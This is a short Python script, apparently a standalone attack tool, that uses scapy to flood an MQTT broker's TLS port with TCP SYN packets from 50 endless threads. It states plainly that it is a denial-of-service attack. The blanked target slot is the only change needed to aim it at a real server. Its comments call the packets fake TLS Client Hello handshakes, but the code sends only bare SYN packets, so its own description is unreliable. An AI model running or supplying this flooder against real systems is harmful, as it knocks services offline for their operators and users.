from scapy.all import *
import random
import time
import threading

# Target server details
TARGET_HOST = "........"  # MQTT broker
TARGET_PORT = 8883  # TLS port for MQTT

# Function to send fake TLS handshakes (Client Hello)
def send_fake_handshake(target_ip, target_port):
    ip = IP(dst=target_ip)
    
    # Crafting the fake TLS handshake (Client Hello)
    syn = TCP(dport=target_port, flags="S", seq=random.randint(1, 1000), sport=random.randint(1024, 65535))
    
    # Send the fake SYN packet to start the handshake
    pkt = ip/syn
    send(pkt)

# Attack function to flood the target with fake handshakes
def flood_fake_handshakes(target_ip, target_port):
    print(f"Starting DoS attack on {target_ip}:{target_port} with fake handshakes...")
    while True:
        send_fake_handshake(target_ip, target_port)
        time.sleep(0.1)  # Adjust the sleep time to control attack speed

# Main function to start multiple threads simulating the DoS attack
def start_attack(num_threads):
    threads = []

    # Starting multiple threads to flood the server with fake handshakes
    for i in range(num_threads):
        thread = threading.Thread(target=flood_fake_handshakes, args=(TARGET_HOST, TARGET_PORT))
        thread.start()
        threads.append(thread)

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

# Run the attack with 50 simultaneous threads
if __name__ == "__main__":
    NUM_THREADS = 50  # Number of threads simulating fake handshakes
    start_attack(NUM_THREADS)

